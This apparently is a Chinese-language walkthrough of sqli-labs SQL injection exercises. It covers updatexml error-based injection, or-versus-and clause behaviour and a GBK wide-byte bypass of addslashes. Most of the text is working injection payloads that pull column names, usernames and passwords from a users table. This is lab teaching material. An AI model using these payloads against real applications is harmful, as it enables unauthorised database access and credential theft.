1.updatexml注入

这题目很多人选用的是updatexml显错注入

updatexml(xml_target,xpath_expr,new_xml)
参数 描述
xml_target 目标xml，形式类似于节点目录(目标xml文档内容)
xpath_expr xml的表达式（xpath格式）(xnl文档路径)
new_xml 用来替换的xml（更新的内容）

例子：

updatexml(1,concat(0x7e,(select database(),0x7e)1)

这里去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符（0x7e，也就是“~”符号）然后就因为不符合输入规则然后报错了。但是报错的时候已经执行了那个子查询代码

明白了原理和注入点后，开始构造payload

payload如下

查字段名

' or  updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) #

查字段值

' or  updatexml(1,concat(0x7e,(select group_concat(username,password)from users) ,0x7e),1) #

却提示错误，原因在于在mysql中你不能先select表然后update它，解决方法是在外面在嵌套一个select语句，也就是将select出的结果作为派生表在select一遍（ps：这里要注意的是每个派生出的表都要有一个别名，所以给select group_concat(xxx)…..查询出来的表起一个名字“a”）

' or  updatexml(1,concat(0x7e,(select * from (select group_concat(username,password) from users) a),0x7e),1) #

该结果之显示出了一部分结果，要显示其他结果要加上limit

' or  updatexml(1,concat(0x7e,(select * from (select username from users limit 4,1) a),0x7e),1) #

下面通过两幅图说明用or和用and的区别

首先是or

可以看到这里他把系统表所有的东西都爆出来了，

在php中拼接而成的sql语句为

SELECT * FROM users WHERE id=' '
union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or '1'='1' LIMIT 0,1

这个or ‘1’=’1把后面的“ ‘ LIMIT 0,1 ” 与原来的sql语句分隔开，变成了我们注入语句的一部分，也就是

union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() or '1'='1' LIMIT 0,1

此时的or ‘1’=’1’在where中就变成了永真条件，所以结果就是查出了系统表第一行所有字段的结果

接下来是and

可以看到这里只查出了当前数据库包含的表的表名，

在php中拼接成的语句为

SELECT * FROM users WHERE id=' '

这个and ‘1’=’1把后面的“ ‘ LIMIT 0,1 ” 与原来的sql语句分隔开，变成了我们注入语句的一部分，也就是

union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and '1'='1' LIMIT 0,1

and语句给注入的sql语句增加了一个为真的条件，但并不会像or那样造成永真，这和and和or的含义有关，and是与，or是或，所以这里只查询出了当前数据库所包含的表

Less-32 Bypass addslashes()

先看源码

可以看到本题应该用单引号闭合，但是这里用斜杠给单引号或者双引号转义所以这里可以用宽字节绕过

原理简单说明下，就是mysql在使用例如gbk编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128），输入%df%27，addslashes会在%27前加一个斜杠，该字符串在mysql执行的时候会将%df和斜杠拼成一个汉字也就是%5c变成了汉字“運”

构造payload

?id=0汉'union select 1,2,group_concat(username,password) from users -- d

注意这里过程中会有些需要用到引号的地方如下列payload

?id=0汉'union select 1,2,column_name from information_schame.columns where table_name='users' -- d

这里的单引号会被过滤掉，在这一关有两种办法：一个是把’users’换成子查询，还有一种是把users换成十六进制0x7573657273就可以了
